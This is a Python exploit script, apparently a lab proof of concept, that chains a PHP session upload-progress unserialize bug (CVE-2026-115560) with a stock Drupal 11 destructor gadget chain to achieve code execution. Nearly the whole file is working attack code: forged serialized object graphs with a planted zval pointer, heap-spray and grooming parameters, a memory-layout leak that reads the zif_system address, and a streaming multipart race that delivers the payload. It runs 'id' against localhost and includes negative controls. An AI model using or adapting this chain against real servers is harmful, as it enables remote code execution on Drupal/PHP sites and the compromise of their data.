#!/usr/bin/env python3
"""LAB-ONLY Drupal 11 P5 through the CVE-2026-115560 session decoder.

Stock Drupal 11.4.11 gadget:
  YamlCacheCollectorDiscovery::__destruct
   -> MenuActiveTrail::destruct
   -> CacheCollector::updateCache   (cid . ':' . __CLASS__ -> 8160-byte spray)
   -> MemoryBackend::get -> prepareItem
   -> unserialize($prepared->data)  (var_destroy re-entry, no allowlist)

The upload-progress field value is "|" + an a:1018 array.  The root P5 graph is
at the first i:99999 and is overwritten by the second i:99999 (delayed dtor
list).  The carrier blob is in the persistent raw session input buffer at
value+DOFF.  The cid's first 8 bytes are the forged zval pointer
(carrier+OFF_ZVAL); the rest is padding (cid length 8102).

Lab-only; targets 127.0.0.1; fixed benign command "id>/tmp/vd 2>&1"; no
arbitrary-command interface.
"""
import argparse
import importlib.util
import os
import secrets
import socket
import sys
import threading
import time

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
_HERE = os.path.dirname(os.path.abspath(__file__))


def _load(name, path):
    spec = importlib.util.spec_from_file_location(name, path)
    m = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(m)
    return m


VD = _load("vdmain", os.path.join(_HERE, "verify_115560_vardestroy.py"))
PC = VD.PC
MAGIC, MOFF, DOFF = PC.MAGIC, PC.MOFF, PC.DOFF
OFF_ZVAL = PC.OFF_ZVAL
PREFIX = PC.PREFIX

CID_CLASS = b"Drupal\\Core\\Cache\\CacheCollector"
# 24-byte zend_string header + NUL + ':' + class == sizeof(var_entries)=8160.
CID_LEN = 8160 - 24 - 1 - 1 - len(CID_CLASS)  # 8102

# Heap-shaping knobs for the stock ZendMM terminal.  The 8160-byte spray
# (lock_name) must reuse the freed var_entries chunk.  ZendMM best-fit picks
# the lowest exact-two-page free run, so we first occupy the lower runs:
#   npad : late 8135-byte strings (8160-byte chunks) in a property parsed last
#   nk   : string-keyed keysToPersist/storage entries; the updateCache $data
#          hashtable grows to a two-page table and stays live across lock_name
NPAD = 4
NK = 65


def pstr(s):
    return b's:' + str(len(s)).encode() + b':"' + s + b'";'


def _bigarray(n, size=8135, ch=b"P"):
    out = b"a:%d:{" % n
    for i in range(n):
        out += b"i:%d;" % i + pstr(ch * size)
    return out + b"}"


def _arrbool(n):
    return (b"a:%d:{" % n +
            b"".join(b's:%d:"k%d";b:1;' % (len(str(i)) + 1, i)
                     for i in range(n)) + b"}")


def _arrint(n):
    return (b"a:%d:{" % n +
            b"".join(b's:%d:"k%d";i:%d;' % (len(str(i)) + 1, i, i)
                     for i in range(n)) + b"}")


def obj(cls, props):
    out = b'O:' + str(len(cls)).encode() + b':"' + cls + b'":' + \
          str(len(props)).encode() + b':{'
    for k, v in props:
        out += pstr(k) + v
    return out + b'}'


def build_cid(ptr, cid_len=CID_LEN, ptr_slots=1):
    """cid padding; first `ptr_slots` 8-byte slots hold the stale pointer."""
    raw = bytearray(b'C' * cid_len)
    if cid_len >= 8:
        p = (ptr & 0xFFFFFFFFFFFFFFFF).to_bytes(8, "little")
        for i in range(min(ptr_slots, cid_len // 8)):
            raw[i * 8:(i + 1) * 8] = p
    return bytes(raw)


def build_p5(ptr, inner=b"R:1020;", cid_len=CID_LEN,
             root_cls=b"Drupal\\Core\\Discovery\\YamlCacheCollectorDiscovery",
             ptr_slots=1, nk=NK, npad=NPAD):
    """Serialized stock Drupal graph; root still has to be placed by caller."""
    cid = build_cid(ptr, cid_len, ptr_slots)
    item = obj(b"stdClass", [
        (b"cid", pstr(cid)),
        (b"data", pstr(inner)),
        (b"created", b"i:0;"),
        (b"expire", b"i:0;"),
        (b"tags", b"a:0:{}"),
        (b"valid", b"b:1;"),
    ])
    time_obj = obj(b"Drupal\\Component\\Datetime\\Time", [
        (b"\0*\0requestStack", b"N;"),
        (b"\0*\0proxyRequestTime", b"d:0;"),
    ])
    lock = obj(b"Drupal\\Core\\Lock\\NullLockBackend", [])
    mem = obj(b"Drupal\\Core\\Cache\\MemoryBackend", [
        (b"\0*\0cache", b"a:1:{" + pstr(cid) + item + b"}"),
        (b"\0*\0time", time_obj),
    ])
    trail = obj(b"Drupal\\Core\\Menu\\MenuActiveTrail", [
        (b"\0*\0menuLinkManager", b"N;"),
        (b"\0*\0routeMatch", b"N;"),
        (b"\0*\0cid", pstr(cid)),
        (b"\0*\0tags", b"a:0:{}"),
        (b"\0*\0cache", mem),
        (b"\0*\0lock", lock),
        (b"\0*\0keysToPersist", _arrbool(nk)),
        (b"\0*\0keysToRemove", b"a:0:{}"),
        (b"\0*\0storage", _arrint(nk)),
        (b"\0*\0cacheCreated", b"N;"),
        (b"\0*\0cacheInvalidated", b"b:0;"),
        (b"\0*\0cacheLoaded", b"b:0;"),
    ])
    disc = obj(root_cls, [
        (b"\0*\0name", b"N;"),
        (b"\0*\0yamlCacheCollector", trail),
        # parsed last: these 8160-byte chunks occupy the lower exact-2-page
        # free runs before var_destroy frees the var_entries chunk
        (b"\0*\0directories", _bigarray(npad)),
    ])
    return disc


def build_value(carrier, zif, ptr, inner=b"R:1020;", cid_len=CID_LEN,
                root_cls=b"Drupal\\Core\\Discovery\\YamlCacheCollectorDiscovery",
                ptr_slots=1, nk=NK, npad=NPAD):
    """Outer a:1018 value with the forged carrier at DOFF and P5 root dup key."""
    assert PREFIX == PC.PREFIX and DOFF == len(PREFIX)
    blob = PC.build_value(carrier, zif, b"\0" * 8,
                          blob_fill=b"\0")[DOFF:DOFF + PC.CARRIER_LEN]
    disc = build_p5(ptr, inner, cid_len, root_cls, ptr_slots, nk, npad)
    tail = (b'";' + b"i:0;N;" * 1015 +
            b"i:99999;" + disc + b"i:99999;i:42;}")
    return PREFIX + blob + tail


def value_len(cid_len=CID_LEN, inner=b"R:1020;", nk=NK, npad=NPAD):
    return len(build_value(0, 0, 0, inner, cid_len, nk=nk, npad=npad))


def build_hold_value(target_len, carrier=0, zif=0):
    """Same-length LAB measurement payload: VdHold root holds at var_destroy."""
    blob = bytearray(PC.build_value(carrier, zif, b"\0" * 8,
                                    blob_fill=b"\0")[DOFF:DOFF + PC.CARRIER_LEN])
    blob[MOFF:MOFF + len(MAGIC) * 2] = MAGIC * 2
    head = PREFIX + bytes(blob) + b'";' + b"i:0;N;" * 1015 + b"i:99999;"
    suffix = b'i:99999;i:42;}'
    pre = b'O:6:"VdHold":1:{s:3:"pad";s:'
    mid = b':"'
    post = b'";}'
    n = target_len - len(head) - len(suffix) - len(pre) - len(mid) - len(post)
    while True:
        d = len(str(n))
        n2 = (target_len - len(head) - len(suffix) - len(pre) - len(mid) -
              len(post) - d)
        if n2 == n:
            break
        n = n2
    out = head + pre + str(n).encode() + mid + b"V" * n + post + suffix
    assert len(out) == target_len, (len(out), target_len)
    return out



def force_fail(payload):
    return VD.force_fail(payload)


def prime(host, port, container, sid):
    dummy = PC.build_value(0, 0, b"\0" * 8, blob_fill=b"\0")
    path = f"/tmp/sessions/sess_{sid}"
    for _ in range(12):
        try:
            VD.http_upload(host, port, "/vd_prime.php", dummy, sid, timeout=20)
        except OSError:
            pass
        if VD.sh(container, f"test -s {path} && echo yes").stdout.strip() == "yes":
            return True
        time.sleep(0.35)
    print(f"[!] prime did not create {path}")
    return False


def measure(host, port, container, sid, cid_len=CID_LEN, nk=NK, npad=NPAD):
    VD.sh(container, "rm -f /tmp/meas_pid /tmp/vd")
    # 7-byte inner placeholder: same value length as the fire inner "R:1020;"
    val = bytearray(build_value(0, 0, 0, inner=b"AAAAAAA", cid_len=cid_len,
                                nk=nk, npad=npad))
    val[DOFF + MOFF:DOFF + MOFF + len(MAGIC) * 2] = MAGIC * 2
    payload = force_fail(bytes(val))
    print(f"[m] measure payload_len={len(payload)} cid_len={cid_len} "
          f"nk={nk} npad={npad}")

    prime(host, port, container, sid)
    th = {}
    t = threading.Thread(target=lambda: th.setdefault(
        "r", VD.http_upload(host, port, "/vd.php?hold=1", payload, sid)),
        daemon=True)
    t.start()

    pid = 0
    for _ in range(100):
        pid = int(VD.sh(container, "cat /tmp/meas_pid 2>/dev/null").stdout.strip() or 0)
        if pid:
            break
        time.sleep(0.1)
    if not pid:
        print("[!] hold did not run (no /tmp/meas_pid)")
        return None

    maps_text = VD.sh(container, f"cat /proc/{pid}/maps").stdout
    from php2shell import maps  # noqa: E402
    lib, mains = maps.parse_maps(maps_text)
    if not lib or not mains:
        print(f"[!] maps parse failed (lib={lib} mains={mains})")
        return None
    main = mains[0]
    zif = VD.readelf_zif(container, lib)
    if not zif:
        print("[!] zif_system symbol not found")
        return None

    scan = VD.sh(container, f"php /var/www/html/vd_scan_prefix.php {pid} "
                           f"{(MAGIC * 2).hex()} {MOFF} {DOFF} {len(PREFIX)}")
    hits = []
    for line in scan.stdout.splitlines():
        parts = line.split()
        if len(parts) < 3 or not parts[0].startswith("0x"):
            continue
        try:
            h = int(parts[0], 16)
            v = int(parts[1].split("=", 1)[1], 16)
        except (ValueError, IndexError):
            continue
        pref = parts[2].split("=", 1)[1] if "=" in parts[2] else ""
        ctx = parts[3].split("=", 1)[1] if len(parts) > 3 and "=" in parts[3] else ""
        hits.append((h, v, pref, ctx))
    if not hits:
        print(f"[!] magic scan failed: {scan.stdout.strip()} {scan.stderr.strip()}")
        return None
    want = PREFIX.hex()
    raw = [x for x in hits if x[2] == want]
    print(f"[m] magic hits={len(hits)} raw-input={len(raw)}")
    for h, v, _p, ctx in raw:
        try:
            ctx_s = bytes.fromhex(ctx).decode("latin1").replace("\x00", ".")
        except ValueError:
            ctx_s = ctx
        print(f"[m]   raw hit magic={h:#x} value_string={v:#x} "
              f"carrier={v + DOFF:#x} delta={v - main:#x} before={ctx_s!r}")
    if raw:
        magic_addr, value_string, _p, _c = raw[0]
    else:
        magic_addr, value_string, _p, _c = hits[0]
        print("[!] no hit carried the raw-input PREFIX; using first hit")
    carrier = value_string + DOFF
    delta = value_string - main

    print(f"[m] pid={pid} main={main:#x} lib={lib:#x} zif={zif:#x}")
    print(f"[m] magic={magic_addr:#x} carrier={carrier:#x} "
          f"value_string={value_string:#x} delta={delta:#x}")

    VD.sh(container, f"kill -9 {pid} 2>/dev/null")
    t.join(timeout=5)
    time.sleep(0.8)
    return main, delta, lib, zif, carrier


def fire(host, port, container, sid, main, delta, zif, bias=0,
         proof="/tmp/vd", cid_len=CID_LEN, path="/vd.php", nk=NK, npad=NPAD):
    value_string = main + delta
    carrier = value_string + DOFF
    ptr = carrier + OFF_ZVAL
    payload = force_fail(build_value(carrier, zif + bias, ptr,
                                     inner=b"R:1020;", cid_len=cid_len,
                                     nk=nk, npad=npad))
    VD.sh(container, f"rm -f {proof} /tmp/meas_pid")
    prime(host, port, container, sid)
    resp = VD.http_upload(host, port, path, payload, sid)
    time.sleep(0.8)
    out = VD.sh(container, f"cat {proof} 2>/dev/null").stdout
    status = resp.split(b"\r\n", 1)[0].decode("latin1", "replace") if resp else "<none>"
    print(f"[f] payload_len={len(payload)} cid_len={cid_len} nk={nk} "
          f"npad={npad} carrier={carrier:#x} zval_ptr={ptr:#x} "
          f"zif={zif + bias:#x}")
    print(f"[f] response={status} proof={out.strip()!r}")
    return "uid=" in out


RACE_BND = b"----115560drupalrace"
RACE_CHUNK = b"B" * 65536


def _race_multipart_head(value):
    return (b"--" + RACE_BND + b"\r\n"
            b'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
            b"|" + value + b"\r\n"
            b"--" + RACE_BND + b"\r\n"
            b'Content-Disposition: form-data; name="f"; filename="x.txt"\r\n'
            b"Content-Type: text/plain\r\n\r\n")


def race_stream(host, port, path, value, sid, nchunks=8, delay=0.6,
                timeout=90):
    """Streaming multipart POST; the progress record lives for ~nchunks*delay."""
    head = _race_multipart_head(value)
    tail = b"\r\n--" + RACE_BND + b"--\r\n"
    chunk = RACE_CHUNK
    declared = len(head) + len(chunk) * nchunks + len(tail)
    s = socket.create_connection((host, port), timeout=timeout)
    req = (f"POST {path} HTTP/1.1\r\nHost: x\r\n"
           f"Cookie: PHPSESSID={sid}\r\n"
           f"Content-Type: multipart/form-data; boundary={RACE_BND.decode()}\r\n"
           f"Content-Length: {declared}\r\nConnection: close\r\n\r\n").encode()
    s.sendall(req + head)
    for _ in range(nchunks):
        try:
            s.sendall(chunk)
        except OSError:
            break
        time.sleep(delay)
    try:
        s.sendall(tail)
    except OSError:
        pass
    s.settimeout(timeout)
    out = b""
    try:
        while True:
            d = s.recv(65536)
            if not d:
                break
            out += d
    except socket.timeout:
        pass
    s.close()
    return out


def race_get(host, port, path, sid, timeout=45):
    s = socket.create_connection((host, port), timeout=timeout)
    req = (f"GET {path} HTTP/1.1\r\nHost: x\r\n"
           f"Cookie: PHPSESSID={sid}\r\nConnection: close\r\n\r\n").encode()
    s.sendall(req)
    s.settimeout(timeout)
    out = b""
    try:
        while True:
            d = s.recv(65536)
            if not d:
                break
            out += d
    except socket.timeout:
        pass
    s.close()
    return out


def race_seed(host, port, sid, dummy, timeout=30):
    """POST the valid a:1018 dummy to /vd_seed.php (field d)."""
    body = (b"--" + RACE_BND + b"\r\n"
            b'Content-Disposition: form-data; name="d"\r\n\r\n' +
            dummy + b"\r\n--" + RACE_BND + b"--\r\n")
    s = socket.create_connection((host, port), timeout=timeout)
    req = (f"POST /vd_seed.php HTTP/1.1\r\nHost: x\r\n"
           f"Cookie: PHPSESSID={sid}\r\n"
           f"Content-Type: multipart/form-data; boundary={RACE_BND.decode()}\r\n"
           f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n").encode()
    s.sendall(req + body)
    s.settimeout(timeout)
    out = b""
    try:
        while True:
            d = s.recv(65536)
            if not d:
                break
            out += d
    except socket.timeout:
        pass
    s.close()
    return out


def _race_scan(container, pid):
    scan = VD.sh(container, f"php /var/www/html/vd_scan_prefix.php {pid} "
                           f"{(MAGIC * 2).hex()} {MOFF} {DOFF} {len(PREFIX)}")
    hits = []
    for line in scan.stdout.splitlines():
        parts = line.split()
        if len(parts) < 3 or not parts[0].startswith("0x"):
            continue
        try:
            h = int(parts[0], 16)
            v = int(parts[1].split("=", 1)[1], 16)
        except (ValueError, IndexError):
            continue
        pref = parts[2].split("=", 1)[1] if "=" in parts[2] else ""
        hits.append((h, v, pref))
    if not hits:
        print(f"[!] race magic scan failed: {scan.stdout.strip()} "
              f"{scan.stderr.strip()}")
        return None
    want = PREFIX.hex()
    raw = [x for x in hits if x[2] == want]
    print(f"[m] race magic hits={len(hits)} raw-input={len(raw)}")
    if raw:
        magic_addr, value_string, _ = raw[0]
    else:
        magic_addr, value_string, _ = hits[0]
        print("[!] no race hit carried the raw-input PREFIX; using first hit")
    print(f"[m] race magic={magic_addr:#x} value_string={value_string:#x}")
    return value_string


def race_measure(host, port, container, sid, settle=0.7, nchunks=8,
                 delay=0.6, nk=NK, npad=NPAD, do_seed=True):
    VD.sh(container, "rm -f /tmp/meas_pid /tmp/vd")
    val = bytearray(build_value(0, 0, 0, inner=b"AAAAAAA", nk=nk, npad=npad))
    val[DOFF + MOFF:DOFF + MOFF + len(MAGIC) * 2] = MAGIC * 2
    payload = force_fail(bytes(val))
    if do_seed:
        d = race_seed(host, port, sid,
                      PC.build_value(0, 0, b"\0" * 8, blob_fill=b"\0"))
        if b"seed ok" not in d:
            print(f"[!] seed failed: {d[:120]!r}")
            return None

    up = {}
    th = threading.Thread(target=lambda: up.setdefault("r", race_stream(
        host, port, "/vd_prime.php", payload, sid, nchunks, delay)),
        daemon=True)
    th.start()
    time.sleep(settle)
    cons = {}
    ct = threading.Thread(target=lambda: cons.setdefault("r", race_get(
        host, port, "/vd.php?hold=1", sid)), daemon=True)
    ct.start()

    pid = 0
    for _ in range(120):
        pid = int(VD.sh(container, "cat /tmp/meas_pid 2>/dev/null").stdout.strip() or 0)
        if pid:
            break
        time.sleep(0.1)
    if not pid:
        print("[!] race measure did not hold (no /tmp/meas_pid)")
        print(f"    consumer={cons.get('r', b'')[:100]!r}")
        return None

    maps_text = VD.sh(container, f"cat /proc/{pid}/maps").stdout
    from php2shell import maps  # noqa: E402
    lib, mains = maps.parse_maps(maps_text)
    if not lib or not mains:
        print(f"[!] race maps parse failed (lib={lib} mains={mains})")
        VD.sh(container, f"kill -9 {pid} 2>/dev/null")
        return None
    main = mains[0]
    zif = VD.readelf_zif(container, lib)
    if not zif:
        print("[!] zif_system symbol not found")
        VD.sh(container, f"kill -9 {pid} 2>/dev/null")
        return None
    value_string = _race_scan(container, pid)
    if value_string is None:
        VD.sh(container, f"kill -9 {pid} 2>/dev/null")
        return None
    carrier = value_string + DOFF
    delta = value_string - main
    print(f"[m] race pid={pid} main={main:#x} lib={lib:#x} zif={zif:#x}")
    print(f"[m] race carrier={carrier:#x} value_string={value_string:#x} "
          f"delta={delta:#x}")
    VD.sh(container, f"kill -9 {pid} 2>/dev/null")
    ct.join(timeout=3)
    th.join(timeout=3)
    time.sleep(0.5)
    return main, delta, lib, zif, carrier


def race_fire(host, port, container, sid, main, delta, zif, bias=0,
              proof="/tmp/vd", nk=NK, npad=NPAD, settle=0.7, nchunks=8,
              delay=0.6, do_seed=True, path="/vd.php"):
    carrier = main + delta + DOFF
    ptr = carrier + OFF_ZVAL
    payload = force_fail(build_value(carrier, zif + bias, ptr,
                                     inner=b"R:1020;", nk=nk, npad=npad))
    VD.sh(container, f"rm -f {proof} /tmp/meas_pid")
    if do_seed:
        d = race_seed(host, port, sid,
                      PC.build_value(0, 0, b"\0" * 8, blob_fill=b"\0"))
        if b"seed ok" not in d:
            print(f"[!] seed failed: {d[:120]!r}")
            return False

    up = {}
    th = threading.Thread(target=lambda: up.setdefault("r", race_stream(
        host, port, "/vd_prime.php", payload, sid, nchunks, delay)),
        daemon=True)
    th.start()
    time.sleep(settle)
    cons = {}
    ct = threading.Thread(target=lambda: cons.setdefault("r", race_get(
        host, port, path, sid)), daemon=True)
    ct.start()
    ct.join(timeout=60)
    th.join(timeout=60)
    time.sleep(0.8)
    out = VD.sh(container, f"cat {proof} 2>/dev/null").stdout
    status = cons.get("r", b"").split(b"\r\n", 1)[0].decode("latin1", "replace") \
        if cons.get("r") else "<none>"
    print(f"[f] race payload_len={len(payload)} nk={nk} npad={npad} "
          f"carrier={carrier:#x} zval_ptr={ptr:#x} zif={zif + bias:#x}")
    print(f"[f] race consumer={status} proof={out.strip()!r}")
    return "uid=" in out


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--target", default="127.0.0.1:18300")
    ap.add_argument("--container", default="php2shell-115560-drupal-8427")
    ap.add_argument("--build", default="8.4.27")
    ap.add_argument("--sid", default=None)
    ap.add_argument("--cid-len", type=int, default=CID_LEN,
                    help="cid padding length (control: 100 -> no 8160 spray)")
    ap.add_argument("--bias-zif", type=lambda x: int(x, 0), default=0,
                    help="shift zif_system (control: non-zero must NOT fire)")
    ap.add_argument("--proof", default="/tmp/vd")
    ap.add_argument("--path", default="/vd.php")
    ap.add_argument("--main", type=lambda x: int(x, 0), default=None)
    ap.add_argument("--delta", type=lambda x: int(x, 0), default=None)
    ap.add_argument("--zif", type=lambda x: int(x, 0), default=None,
                    help="skip measure: zif_system address")
    ap.add_argument("--lib", type=lambda x: int(x, 0), default=None,
                    help="skip measure: libphp base (zif via readelf)")
    ap.add_argument("--nk", type=int, default=NK,
                    help="string-keyed keysToPersist entries (heap shaping)")
    ap.add_argument("--npad", type=int, default=NPAD,
                    help="late 8160-byte strings (heap shaping)")
    ap.add_argument("--settle", type=float, default=0.7,
                    help="race: seconds from upload start to consumer GET")
    ap.add_argument("--nchunks", type=int, default=8,
                    help="race: 64 KiB file chunks")
    ap.add_argument("--delay", type=float, default=0.6,
                    help="race: seconds between chunks")
    ap.add_argument("--attempts", type=int, default=4,
                    help="race: fire attempts with a fresh SID/seed each")
    ap.add_argument("--measure-attempts", type=int, default=4,
                    help="race: measure attempts")
    ap.add_argument("--no-seed", dest="do_seed", action="store_false",
                    help="race negative control: skip the persistent first record")
    ap.add_argument("mode", nargs="?", default="run",
                    choices=["measure", "fire", "run", "race", "len"])
    args = ap.parse_args()

    host, _, port = args.target.partition(":")
    port = int(port or 80)
    if args.mode == "len":
        print(f"value_len={value_len(args.cid_len, nk=args.nk, npad=args.npad)} "
              f"DOFF={DOFF:#x} cid_len={args.cid_len} nk={args.nk} "
              f"npad={args.npad}")
        return 0

    print(f"[*] 115560 session decode -> Drupal 11 P5 ({args.build})")
    print(f"    target {args.target} container {args.container} "
          f"cid_len={args.cid_len} nk={args.nk} npad={args.npad}")

    if args.mode == "race":
        print(f"    race settle={args.settle}s chunks={args.nchunks}x64KiB "
              f"delay={args.delay}s window~{args.nchunks * args.delay:.1f}s "
              f"seed={args.do_seed}")
        main_addr, delta, lib, zif = args.main, args.delta, args.lib, args.zif
        if main_addr is None or delta is None:
            res = None
            for i in range(args.measure_attempts):
                sid = args.sid or secrets.token_hex(16)
                print(f"[m] race measure attempt {i + 1}/{args.measure_attempts} "
                      f"sid={sid}")
                res = race_measure(host, port, args.container, sid,
                                   args.settle, args.nchunks, args.delay,
                                   args.nk, args.npad, args.do_seed)
                if res:
                    break
                time.sleep(0.5)
            if not res:
                print("[!] race did not produce the real var_destroy hold")
                return 2
            main_addr, delta, lib, zif, _carrier = res
        if not zif:
            if not lib:
                print("[!] race fire needs --zif or --lib")
                return 2
            zif = VD.readelf_zif(args.container, lib)
            if not zif:
                print("[!] zif_system symbol not found")
                return 2
        if args.bias_zif:
            print(f"    [!] BIAS zif by {args.bias_zif:#x} "
                  f"(control: must not fire)")
        for i in range(args.attempts):
            sid = args.sid or secrets.token_hex(16)
            print(f"[f] race fire attempt {i + 1}/{args.attempts} sid={sid}")
            if race_fire(host, port, args.container, sid, main_addr, delta, zif,
                         args.bias_zif, args.proof, args.nk, args.npad,
                         args.settle, args.nchunks, args.delay, args.do_seed,
                         args.path):
                print("[EVIDENCE] cleanup=On race -> Drupal P5 -> "
                      "var_destroy -> uid=33")
                return 0
            if i + 1 < args.attempts:
                print("[i] race fire missed; re-measuring carrier delta")
                res = race_measure(host, port, args.container,
                                   args.sid or secrets.token_hex(16),
                                   args.settle, args.nchunks, args.delay,
                                   args.nk, args.npad, args.do_seed)
                if res:
                    main_addr, delta, _lib, zif, _carrier = res
            time.sleep(0.4)
        print("[!] race no proof written")
        return 1

    main_addr, delta, lib, zif = args.main, args.delta, args.lib, args.zif
    if args.mode in ("measure", "run"):
        res = measure(host, port, args.container,
                      args.sid or secrets.token_hex(16), args.cid_len,
                      args.nk, args.npad)
        if not res:
            return 2
        main_addr, delta, lib, zif, _carrier = res

    if args.mode == "measure":
        return 0
    if main_addr is None or delta is None:
        print("[!] fire needs --main and --delta (or 'run' to measure)")
        return 2
    if not zif:
        if not lib:
            print("[!] fire needs --zif or --lib")
            return 2
        zif = VD.readelf_zif(args.container, lib)
        if not zif:
            print("[!] zif_system symbol not found")
            return 2

    if args.bias_zif:
        print(f"    [!] BIAS zif by {args.bias_zif:#x} (control: must not fire)")
    if fire(host, port, args.container, args.sid or secrets.token_hex(16),
            main_addr, delta, zif, args.bias_zif, args.proof, args.cid_len,
            args.path, args.nk, args.npad):
        print("[EVIDENCE] 115560 session decode -> Drupal P5 -> var_destroy -> uid=33")
        return 0
    print("[!] no proof written")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())





